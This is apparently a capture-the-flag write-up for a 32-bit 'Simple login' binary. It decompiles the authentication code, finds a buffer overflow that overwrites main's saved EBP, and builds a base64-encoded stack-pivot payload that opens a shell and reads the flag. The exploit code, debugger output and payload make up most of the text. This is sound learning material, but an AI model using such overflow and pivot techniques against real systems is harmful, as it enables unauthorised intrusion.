# Simple login

## What the program does

Takes input from the standard input and returns some kind of hash out of it.

Example:
```
Authenticate : Hello   
hash : 656a35b2e1593fedfeff660b397bc3f2
```

## Binary examination
- 32 bit
- ELF
- Statically linked
- Canary disabled
- NX bit enabled


## Code Analysis


```c
int main() {
    // -- snip --
    printf("Authenticate : ");
    __isoc99_scanf(&DAT_080da6b5,auth_buffer);
    memset(input,0,0xc);
    local_38 = (void *)0x0;
    decoded_length = Base64Decode(auth_buffer,&local_38);
    if (decoded_length < 0xd) {
        memcpy(input,local_38,decoded_length);
        auth_succeeded = auth(decoded_length);
        if (auth_succeeded == 1) {
            correct();
        }
    }
    else {
        puts("Wrong Length");
    }
    // -- snip --
}
```

So apperantly our input is decoded using base64, and then passed to `auth` function.
If authentication succeeds it returns 1, else returns 0.

```C
uint auth(size_t param_1)
{
  int iVar1;
  undefined local_18 [8];
  char *local_10;
  undefined auStack12 [8];
  
  memcpy(auStack12,input,param_1);
  local_10 = (char *)calc_md5(local_18,0xc);
  printf("hash : %s\n",local_10);
  iVar1 = strcmp("f87cd601aa7fedca99018a8be88eda34",local_10);
  return (uint)(iVar1 == 0);
}
```

If the authentication succeeds it calls to `correct`:

```C
void correct(void)

{
  if (input._0_4_ == -0x21524111) {
    puts("Congratulation! you are good!");
    system("/bin/sh");
  }

  exit(0);
}
```


## Exploitation

### Buffer overflow in `0x08049397`

In this address there's a call to `scanf` with the following format: `%30s`. That means that scanf will take 31 bytes as input, 30 characters + 1 nullbyte.

```C
uint decoded_length;
char auth_buffer [30];
// -- snip --
__isoc99_scanf(&DAT_080da6b5,auth_buffer);
```

since auth_buffer is in length of 30, it will overflow with one byte to
decoded_length.

```bash
pwndbg> x/1wx $esp + 0x3c
0xffffd53c:     0x080481d0
# -- Take input --
pwndbg> x/1wx $esp + 0x3c
0xffffd53c:     0x08048100
```

Couldn't find how exactly this finding helps.


### Buffer overflow in `0x080492ba`

```C
uint auth(size_t param_1)
{
    // -- snip --     
    undefined auStack12 [8];
    // -- snip --     
    memcpy(auStack12,input,param_1);
}
```

As we can see in `main`, param_1's length may be up to 13 bytes: 

```C
// in main
if (decoded_length < 0xd)
```

This means the buffer overflows if we enter a value which is 12 bytes (plus nullbytes). When we do that we'll need to encode our payload with base64.

For example:
`AAAAAAAAAAAA` -> `QUFBQUFBQUFBQUFB`

```sh
$ ./login
Authenticate : QUFBQUFBQUFBQUFB
hash : 58d4c1cabdeaca6e39249ddd24bef9c6
Segmentation fault (core dumped)
```

By running the binary in GDB and providing it with `AAAABBBBCCCC` (encoded) I found out that the segfault is happening since we override the saved EBP (in main) with `CCCC`. 

This means that we have full control of EBP.


### Recap 

**Stack frame**
```
------------------------
     Return Address       
------------------------
       Saved EBP            => CCCC
------------------------
     Local Variables
          ...
```

**`LEAVE` instruction**
```asm
mov esp, ebp
pop ebp
```

**`RET` instruction**
```
pop ecx
jmp ecx
```

### Building the payload

We need a payload that will:
- Set EBP to the middle of our decoded input. After the leave instruction in `main` executes, our customly crafted EBP will be assigned to ESP.
- Build the payload so the 4 bytes from our input that'll be popped by `RET` will be the address that we want to jump into.


**Important values**
- Address to jump to: `0x0804927f`
- Decoded input address: `0x0811eb40`


Our payload needs to be:
'AAAA' || [Address to jump] || [Input address]

The input address will first point to `AAAA`, and when the leave instruction executes it'll increase ESP by 4, which means it'll point to the address we want to jump into.

This address will be poped by `RET` and we should get a shell.

```python
In [26]: payload = b'AAAA' + p32(0x0804927f) + p32(0x0811eb40)                                       

In [27]: base64_encode(payload)                   
Out[27]: (b'QUFBQX+SBAhA6xEI\n', 12)

```

## Conclusion
I solved this challenge by finding a BOF in `auth` function that let me write anything to `main`'s base pointer. I manipulated that base pointer so it will point to my own buffer, and then when LEAVE and RET execute, I have full control of `main`'s return address ;)

```
Authenticate : QUFBQX+SBAhA6xEI
hash : 6e9c02a33b431aa793c8cf572d8d3b2c
AAA@
ls
flag
log
simplelogin
super.pl
cat flag
control EBP, control ESP, control EIP, control the world~
```
